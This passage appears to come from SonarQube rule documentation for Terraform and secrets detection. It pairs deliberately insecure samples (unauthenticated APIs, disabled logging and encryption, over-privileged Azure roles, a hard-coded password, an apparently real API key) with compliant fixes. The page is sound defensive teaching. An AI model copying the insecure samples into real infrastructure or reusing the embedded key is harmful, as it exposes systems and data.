<p>If an attacker is able to intercept and modify network traffic, they can filter the list of algorithms sent between the client and the server. By
removing all secure algorithms from the list, the attacker can force the use of any insecure algorithms that remain.</p>
<p>The <code>RESTRICTED</code> profile only allows strong cryptographic algorithms to be used. There are no insecure algorithms that can compromise
the security of the connection.</p>
<h3>Pitfalls</h3>
<p>Older client applications may not support the algorithms required by the <code>RESTRICTED</code> profile. These applications will no longer be able
to connect.</p>
<p>If the <code>MODERN</code> or <code>COMPATIBLE</code> profiles must be used so that older clients can connect, consider using additional measures
such as TLS client certificates or IP allow-lists to improve security.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
<h3>External coding guidelines</h3>
<ul>
  <li> SSL Labs - <a href="https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#23-use-secure-cipher-suites">SSL and TLS
  Deployment Best Practices</a> - Use Secure Cipher Suites </li>
  <li> Google - <a href="https://cloud.google.com/load-balancing/docs/ssl-policies-concepts#defining_an_ssl_policy">Google Cloud Load Balancing</a> -
  Defining an SSL policy </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6333">
              terraform:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul>
  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>
  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>
  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>A public API that doesn’t have access control implemented:</p>
<pre>
resource "aws_api_gateway_method" "noncompliantapi" {
  authorization = "NONE" # Sensitive
  http_method   = "GET"
}
</pre>
<h2>Compliant Solution</h2>
<p>An API that implements AWS IAM permissions:</p>
<pre>
resource "aws_api_gateway_method" "compliantapi" {
  authorization = "AWS_IAM"
  http_method   = "GET"
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6412">
              terraform:S6412
            </a>
          </td>
          <td>
            <details>
              <p>When object versioning for Google Cloud Storage (GCS) buckets is enabled, different versions of an object are stored in the bucket, preventing
accidental deletion. A specific version can always be deleted when the generation number of an object version is specified in the request.</p>
<p>Object versioning cannot be enabled on a bucket with a retention policy. A retention policy ensures that an object is retained for a specific
period of time even if a request is made to delete or replace it. Thus, a retention policy locks the single current version of an object in the
bucket, which differs from object versioning where different versions of an object are retained.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The bucket stores information that require high availability. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable GCS bucket versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<p>Versioning is disabled by default:</p>
<pre>
resource "google_storage_bucket" "example" { # Sensitive
  name          = "example"
  location      = "US"
}
</pre>
<h2>Compliant Solution</h2>
<p>Versioning is enabled:</p>
<pre>
resource "google_storage_bucket" "example" {
  name          = "example"
  location      = "US"

  versioning {
    enabled = "true"
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cloud.google.com/storage/docs/object-versioning?hl=en">GCP documentation</a> - Object Versioning </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6258">
              terraform:S6258
            </a>
          </td>
          <td>
            <details>
              <p>Disabling logging of this component can lead to missing traceability in case of a security incident.</p>
<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage
enables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>
<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will
allow investigators to establish a timeline of the actions perpetrated by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This component is essential for the information system infrastructure. </li>
  <li> This component is essential for mission-critical functions. </li>
  <li> Compliance policies require this component to be monitored. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable the logging capabilities of this component. Depending on the component, new permissions might be required by the logging storage
components.<br> You should consult the official documentation to enable logging for the impacted components. For example, AWS Application Load
Balancer Access Logs <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/enable-access-logging.html">require an additional
bucket policy</a>.</p>
<h2>Sensitive Code Example</h2>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket">S3 access requests</a>:</p>
<pre>
resource "aws_s3_bucket" "example" { # Sensitive
  bucket = "example"
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage">API Gateway stages</a>:</p>
<pre>
resource "aws_api_gateway_stage" "example" { # Sensitive
  xray_tracing_enabled = false # Sensitive
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster">MSK Broker logs</a>:</p>
<pre>
resource "aws_msk_cluster" "example" {
  cluster_name           = "example"
  kafka_version          = "2.7.1"
  number_of_broker_nodes = 3

  logging_info {
    broker_logs { # Sensitive
      firehose {
        enabled = false
      }
      s3 {
        enabled = false
      }
    }
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker">MQ Brokers</a>:</p>
<pre>
resource "aws_mq_broker" "example" {
  logs {  # Sensitive
    audit   = false
    general = false
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster">Amazon DocumentDB</a>:</p>
<pre>
resource "aws_docdb_cluster" "example" { # Sensitive
  cluster_identifier = "example"
}
</pre>
<p>For Azure <a href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service">App Services</a>:</p>
<pre>
resource "azurerm_app_service" "example" {
  logs {
    application_logs {
      file_system_level = "Off" # Sensitive
      azure_blob_storage {
        level = "Off"           # Sensitive
      }
    }
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork/">VPC Subnetwork</a>:</p>
<pre>
resource "google_compute_subnetwork" "example" { # Sensitive
  name          = "example"
  ip_cidr_range = "10.2.0.0/16"
  region        = "us-central1"
  network       = google_compute_network.example.id
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance/">SQL Database
Instance</a>:</p>
<pre>
resource "google_sql_database_instance" "example" {
  name = "example"

  settings { # Sensitive
    tier = "db-f1-micro"
    ip_configuration {
      require_ssl  = true
      ipv4_enabled = true
    }
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster/">Kubernetes Engine (GKE)
cluster</a>:</p>
<pre>
resource "google_container_cluster" "example" {
  name               = "example"
  logging_service    = "none" # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket">S3 access requests</a>:</p>
<pre>
resource "aws_s3_bucket" "example-logs" {
  bucket = "example_logstorage"
  acl    = "log-delivery-write"
}

resource "aws_s3_bucket" "example" {
  bucket = "example"

  logging { # AWS provider &lt;= 3
      target_bucket = aws_s3_bucket.example-logs.id
      target_prefix = "log/example"
  }
}

resource "aws_s3_bucket_logging" "example" { # AWS provider &gt;= 4
  bucket = aws_s3_bucket.example.id

  target_bucket = aws_s3_bucket.example-logs.id
  target_prefix = "log/example"
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage">API Gateway stages</a>:</p>
<pre>
resource "aws_api_gateway_stage" "example" {
  xray_tracing_enabled = true

  access_log_settings {
    destination_arn = "arn:aws:logs:eu-west-1:123456789:example"
    format = "..."
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster">MSK Broker logs</a>:</p>
<pre>
resource "aws_msk_cluster" "example" {
  cluster_name           = "example"
  kafka_version          = "2.7.1"
  number_of_broker_nodes = 3

  logging_info {
    broker_logs {
      firehose   {
        enabled = false
      }
      s3 {
        enabled = true
        bucket  = "example"
        prefix  = "log/msk-"
      }
    }
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker">MQ Brokers</a>, enable
<code>audit</code> or <code>general</code>:</p>
<pre>
resource "aws_mq_broker" "example" {
  logs {
    audit   = true
    general = true
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster">Amazon DocumentDB</a>:</p>
<pre>
resource "aws_docdb_cluster" "example" {
  cluster_identifier              = "example"
  enabled_cloudwatch_logs_exports = ["audit"]
}
</pre>
<p>For Azure <a href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service">App Services</a>:</p>
<pre>
resource "azurerm_app_service" "example" {
 logs {
    http_logs {
      file_system {
        retention_in_days = 90
        retention_in_mb   = 100
      }
    }

 application_logs {
      file_system_level = "Error"
      azure_blob_storage {
        retention_in_days = 90
        level             = "Error"
      }
    }
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork/">VPC Subnetwork</a>:</p>
<pre>
resource "google_compute_subnetwork" "example" {
  name          = "example"
  ip_cidr_range = "10.2.0.0/16"
  region        = "us-central1"
  network       = google_compute_network.example.id

  log_config {
    aggregation_interval = "INTERVAL_10_MIN"
    flow_sampling        = 0.5
    metadata             = "INCLUDE_ALL_METADATA"
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance/">SQL Database
Instance</a>:</p>
<pre>
resource "google_sql_database_instance" "example" {
  name             = "example"

  settings {
    ip_configuration {
      require_ssl  = true
      ipv4_enabled = true
    }
    database_flags {
      name  = "log_connections"
      value = "on"
    }
    database_flags {
      name  = "log_disconnections"
      value = "on"
    }
    database_flags {
      name  = "log_checkpoints"
      value = "on"
    }
    database_flags {
      name  = "log_lock_waits"
      value = "on"
    }
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster/">Kubernetes Engine (GKE)
cluster</a>:</p>
<pre>
resource "google_container_cluster" "example" {
  name               = "example"
  logging_service    = "logging.googleapis.com/kubernetes"
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html">AWS Documentation</a> - Logging requests using server access
  logging </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/778">CWE-778 - Insufficient Logging</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6330">
              terraform:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The queue contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue">aws_sqs_queue</a>:</p>
<pre>
resource "aws_sqs_queue" "queue" {  # Sensitive, encryption disabled by default
  name = "sqs-unencrypted"
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue">aws_sqs_queue</a>:</p>
<pre>
resource "aws_sqs_queue" "queue" {
  name = "sqs-encrypted"
  kms_master_key_id = aws_kms_key.enc_key.key_id
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html">AWS Documentation</a> -
  Encryption at rest </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6252">
              terraform:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be in three states related to versioning:</p>
<ul>
  <li> unversioned (default one) </li>
  <li> enabled </li>
  <li> suspended </li>
</ul>
<p>When the S3 bucket is unversioned or has versioning suspended it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The bucket stores information that require high availability. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<p>Versioning is disabled by default:</p>
<pre>
resource "aws_s3_bucket" "example" { # Sensitive
  bucket = "example"
}
</pre>
<h2>Compliant Solution</h2>
<p>Versioning is enabled for AWS provider version 4 or above:</p>
<pre>
resource "aws_s3_bucket" "example" {
  bucket = "example"
}

resource "aws_s3_bucket_versioning" "example-versioning" {
  bucket = aws_s3_bucket.example.id
  versioning_configuration {
    status = "Enabled"
  }
}
</pre>
<p>Versioning is enabled for AWS provider version 3 or below:</p>
<pre>
resource "aws_s3_bucket" "example" {
  bucket = "example"

  versioning {
    enabled = true
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html">AWS documentation</a> - Using versioning in S3 buckets </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6255">
              terraform:S6255
            </a>
          </td>
          <td>
            <details>
              <p>When S3 buckets versioning is enabled it’s possible to add an additional authentication factor before being allowed to delete versions of an object
or changing the versioning state of a bucket. It prevents accidental object deletion by forcing the user sending the delete request to prove that he
has a valid MFA device and a corresponding valid token.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information that is required to be preserved on the long term. </li>
  <li> The S3 bucket grants delete permission to many users. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 MFA delete, note that:</p>
<ul>
  <li> MFA delete can only be enabled with the AWS CLI or API and with the root account. </li>
  <li> To delete an object version, the API should be used with the <code>x-amz-mfa</code> header. </li>
  <li> The API request, with the <code>x-amz-mfa</code> header, can only be used in HTTPS. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>A versioned S3 bucket does not have MFA delete enabled for AWS provider version 3 or below:</p>
<pre>
resource "aws_s3_bucket" "example" { # Sensitive
  bucket = "example"

  versioning {
    enabled = true
  }
}
</pre>
<p>A versioned S3 bucket does not have MFA delete enabled for AWS provider version 4 or above:</p>
<pre>
resource "aws_s3_bucket" "example" {
  bucket = "example"
}

resource "aws_s3_bucket_versioning" "example" { # Sensitive
  bucket = aws_s3_bucket.example.id
  versioning_configuration {
    status = "Enabled"
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>MFA delete is enabled for AWS provider version 3 or below:</p>
<pre>
resource "aws_s3_bucket" "example" {
  bucket = "example"

  versioning {
    enabled = true
    mfa_delete = true
  }
}
</pre>
<p>MFA delete is enabled for AWS provider version 4 or above:</p>
<pre>
resource "aws_s3_bucket" "example" {
  bucket = "example"
}

resource "aws_s3_bucket_versioning" "example" {
  bucket = aws_s3_bucket.example.id
  versioning_configuration {
    status = "Enabled"
    mfa_delete = "Enabled"
  }
  mfa = "${var.MFA}"
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/MultiFactorAuthenticationDelete.html">AWS documentation</a> - Configuring MFA
  delete </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/308">CWE-308 - Use of Single-factor Authentication</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6332">
              terraform:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The file system contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system">aws_efs_file_system</a>:</p>
<pre>
resource "aws_efs_file_system" "fs" {  # Sensitive, encryption disabled by default
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system">aws_efs_file_system</a>:</p>
<pre>
resource "aws_efs_file_system" "fs" {
  encrypted = true
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html">AWS Documentation</a> - Data encryption in Amazon EFS </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6375">
              terraform:S6375
            </a>
          </td>
          <td>
            <details>
              <p>Azure Active Directory offers built-in roles that can be assigned to users, groups, or service principals. Some of these roles should be carefully
assigned as they grant sensitive permissions like the ability to reset passwords for all users.</p>
<p>An Azure account that fails to limit the use of such roles has a higher risk of being breached by a compromised owner.</p>
<p>This rule raises an issue when one of the following roles is assigned:</p>
<ul>
  <li> Application Administrator </li>
  <li> Authentication Administrator </li>
  <li> Cloud Application Administrator </li>
  <li> Global Administrator </li>
  <li> Groups Administrator </li>
  <li> Helpdesk Administrator </li>
  <li> Password Administrator </li>
  <li> Privileged Authentication Administrator </li>
  <li> Privileged Role Administrator </li>
  <li> User Administrator </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The user, group, or service principal doesn’t use the entirety of this extensive set of permissions to operate on a day-to-day basis. </li>
  <li> It is possible to follow the Separation of Duties principle and split permissions between multiple users, but it’s not enforced. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Limit the assignment of Global Administrator roles to less than five people or service principals. </li>
  <li> Apply the least privilege principle by choosing a role with a limited set of permissions. </li>
  <li> If no built-in role meets your needs, create a custom role with as few permissions as possible. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
resource "azuread_directory_role" "example" {
  display_name = "Privileged Role Administrator" # Sensitive
}

resource "azuread_directory_role_member" "example" {
  role_object_id   = azuread_directory_role.example.object_id
  member_object_id = data.azuread_user.example.object_id
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource "azuread_directory_role" "example" {
  display_name = "Usage Summary Reports Reader"
}

resource "azuread_directory_role_member" "example" {
  role_object_id   = azuread_directory_role.example.object_id
  member_object_id = data.azuread_user.example.object_id
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference">Azure AD Documentation</a> - Azure AD built-in
  roles </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/roles/best-practices">Azure AD Documentation</a> - Best practices for Azure AD
  roles </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6703">
              secrets:S6703
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Passwords are often used to authenticate users against database engines. They are associated with user accounts that are granted specific
permissions over the database and its hosted data.</p>
<p>If a database password leaks to an unintended audience, it can have serious consequences for the security of your database instance, the data
stored within it, and the applications that rely on it.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Security downgrade</h4>
<p>Applications relying on a database instance can suffer a security downgrade if an access password is leaked to attackers. Depending on the purposes
the application uses the database for, consequences can range from low-severity issues, like defacement, to complete compromise.</p>
<p>For example, if the database instance is used as part of the authentication process of an application, attackers with access to the database will
likely be able to bypass this security mechanism.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<p><strong>Never hard-code secrets, not even the default values</strong></p>
<p>It is important that you do not hard-code secrets, even default values.</p>
<p>First, hard-coded default secrets are often short and can be easily compromised even by attackers who do not have access to the code base.</p>
<p>Second, hard-coded default secrets can cause problems if they need to be changed or replaced.</p>
<p>And most importantly, there is always the possibility to accidentally set default secrets for production services, which can lead to security
vulnerabilities and make production insecure by default.</p>
<p>To minimize these risks, it is recommended to apply the above strategies, even for the default settings.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public static string ConnectionString = "server=database-server;uid=user;pwd=P@ssw0rd;database=ProductionData";
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public static string ConnectionString = String.format(
    "server=database-server;uid=user;pwd=%s;database=ProductionData",
    System.getenv("DB_PASSWORD")
)
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6705">
              secrets:S6705
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>An OpenWeather API key is a unique identifier that allows you to access the OpenWeatherMap API. The OpenWeatherMap API provides weather data and
forecasts for various locations worldwide.</p>
<p>If an OpenWeather API key leaks to an unintended audience, it can have several security consequences. Attackers may use the leaked API key to
access the OpenWeatherMap API and consume the weather data without proper authorization. This can lead to excessive usage, potentially exceeding the
API rate limits, or violating the terms of service.</p>
<p>Moreover, depending on the pricing model of the corresponding OpenWeather account, unauthorized usage of the leaked API key can result in
unexpected charges or increased costs. Attackers may consume a large amount of data or make excessive requests, leading to additional expenses for the
API key owner.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
url = "http://api.openweathermap.org/data/2.5/weather?units=imperial&amp;appid=ae73acab47d0fc4b71b634d943b00518&amp;q="
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os
token = os.environ["OW_TOKEN"]

uri = "http://api.openweathermap.org/data/2.5/weather?units=imperial&amp;appid={token}&amp;q="
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<p>OpenWeather Documentation - <a href="https://openweathermap.org/appid">API keys</a></p>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6706">
              secrets:S6706
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A cryptographic private key is a piece of sensitive information that is used in asymmetric cryptography. They are used in conjunction with public
keys to secure communications and authenticate digital signatures.</p>
<p>Private keys can be used to achieve two main cryptographic operations, encryption or digital signature. Those operations are the basis of multiple
higher-level security mechanisms such as:</p>
<ul>
  <li> User authentication </li>
  <li> Servers authentication, for example in the X509 trust model </li>
  <li> E-mail encryption </li>
</ul>
<p>Disclosing a cryptographic private key to an unintended audience can have severe security consequences. The exact impact will vary depending on the
role of the key and the assets it protects.</p>
<p>For example, if the key is used in conjunction with an X509 certificate to authenticate a web server as part of TLS communications, attackers will
be able to impersonate that server. This leads to Man-In-The-Middle-Attacks that would affect both the confidentiality and integrity of the
communications from clients to that server.</p>
<p>If the key was used as part of e-mail protocols, attackers might be able to send e-mails on behalf of the key owner or decrypt previously encrypted
emails. This might lead to sensitive information disclosure and reputation loss.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
